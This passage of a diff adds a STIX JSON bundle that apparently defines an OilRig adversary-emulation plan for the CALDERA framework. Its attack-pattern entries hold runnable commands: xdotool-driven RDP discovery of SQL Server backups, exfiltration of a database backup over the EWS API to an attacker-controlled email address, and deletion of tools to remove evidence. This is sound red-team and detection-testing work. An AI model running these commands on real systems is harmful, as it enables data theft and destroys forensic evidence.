+                                "command": "sleep 3;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'dir \"C:\\Program Files\\Microsoft SQL Server\\\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'dir \"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 4;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "File and Directory Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--05044a70-cfd1-4ef1-a75a-2eb52cda6dd3",
+            "created": "2024-02-04T21:17:50.948953Z",
+            "modified": "2024-02-04T21:17:50.948953Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--f1f34439-ca0d-4fe7-99af-a198a29b6a3e"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--885c14a2-bc56-4176-8671-4cb25489ae39",
+            "created": "2024-02-04T21:17:50.949154Z",
+            "modified": "2024-02-04T21:17:50.949154Z",
+            "name": "OilRig Exfiltrate Data via EWS API to attacker-controlled email",
+            "description": "Requires xdotool to be installed on the running machine. \nCreates a directory to stage collected data and moves RDAT to the newly created directory.\nRead and exfiltrate the data from sitedata_db.bak in chunks via EWS API to an attacker-controlled email.\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1048.003",
+                    "input_arguments": {
+                        "exfil.target.email": {
+                            "default": "sistan@shirinfarhad.com",
+                            "description": "The adversary-controlled email address used to exfiltrate data.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "sleep 2;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'mkdir C:\\Programdata\\Vmware';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'move C:\\Programdata\\Nt.dat C:\\Programdata\\Vmware\\VMware.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'cd \"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'C:\\ProgramData\\Vmware\\VMware.exe --path=\"sitedata_db.bak\" --to=\"#{exfil.target.email}\" --from=\"#{initial.target.user}@#{network.domain.name}\" --server=\"#{second.target.ip}\" --password='#{initial.target.password}' --chunksize=\"200000\"';\nsleep 1; \nxdotool key --window \"$rdp_window\" Return;\nsleep 15;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--50bda9ec-455a-4348-80ff-98df8775adc6",
+            "created": "2024-02-04T21:17:50.949663Z",
+            "modified": "2024-02-04T21:17:50.949663Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--885c14a2-bc56-4176-8671-4cb25489ae39",
+            "target_ref": "email-addr--ccdb29d9-9c60-508f-b321-6e755c8408eb"
+        },
+        {
+            "type": "email-addr",
+            "spec_version": "2.1",
+            "id": "email-addr--ccdb29d9-9c60-508f-b321-6e755c8408eb",
+            "value": "sistan@shirinfarhad.com"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f84e9799-70b5-4ac7-8d95-68889c638fcc",
+            "created": "2024-02-04T21:17:50.949865Z",
+            "modified": "2024-02-04T21:17:50.949865Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--885c14a2-bc56-4176-8671-4cb25489ae39"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--0c5cf9e2-3152-4b4c-9629-2ed7a00da09d",
+            "created": "2024-02-04T21:17:50.950101Z",
+            "modified": "2024-02-04T21:17:50.950101Z",
+            "name": "OilRig Cleanup via RDP",
+            "description": "Requires xdotool to be installed on the running machine. \nEmulates OilRig's cleanup and egress from the target network.\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "sleep 3;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'del C:\\ProgramData\\VMware\\VMware.exe';\nsleep 3; \nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'rmdir C:\\ProgramData\\VMware';\nsleep 3; \nxdotool key --window \"$rdp_window\" Return;\nsleep 1;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 1;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;\nxdotool type --window \"$rdp_window\" 'del C:\\Windows\\System32\\mom64.exe C:\\Windows\\temp\\Nt.dat C:\\Windows\\System32\\ps.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;   \nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;\n\nkill $(ps aux | grep \"sshd: #{caldera.user.name}\" | grep -v priv | grep -v grep | awk '{print $2}')\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--11e9fb7c-02f0-41d8-862c-443fb339f841",
+            "created": "2024-02-04T21:17:50.95029Z",
+            "modified": "2024-02-04T21:17:50.95029Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--0c5cf9e2-3152-4b4c-9629-2ed7a00da09d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15",
+            "created": "2024-02-04T21:17:50.950774Z",
+            "modified": "2024-02-04T21:17:50.950774Z",
+            "name": "OilRig Cleanup on Gosta",
+            "description": "Delete VALUEVAULT plink.exe.\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "del C:\\Users\\gosta\\AppData\\Roaming\\fsociety.dat C:\\Users\\Public\\Downloads\\plink.exe;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f87f974e-3413-4a5b-a73c-41caa2f27454",
+            "created": "2024-02-04T21:17:50.951285Z",
+            "modified": "2024-02-04T21:17:50.951285Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--16767c68-a865-46af-a0e4-ff8d742efc3f",
+            "created": "2024-02-04T21:17:50.951644Z",
+            "modified": "2024-02-04T21:17:50.951644Z",
+            "name": "OilRig Kill Gosta Agent",
+            "description": "Gosta Agent kills itself\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": {
+                        "server.api.key": {
+                            "default": "ADMIN123",
+                            "description": "API key for the CALDERA server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "curl -s -H \"KEY:#{server.api.key}\" -H \"Content-Type: application/json\" -X PATCH http://#{caldera.server.ip}:8888/api/v2/agents/#{paw} -d \"{\\\"watchdog\\\":1}\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8ab08f31-fcd2-4a2d-9620-5ec8ac3b9d4d",
+            "created": "2024-02-04T21:17:50.952171Z",
+            "modified": "2024-02-04T21:17:50.952171Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--16767c68-a865-46af-a0e4-ff8d742efc3f"
+        }
+    ]
+}
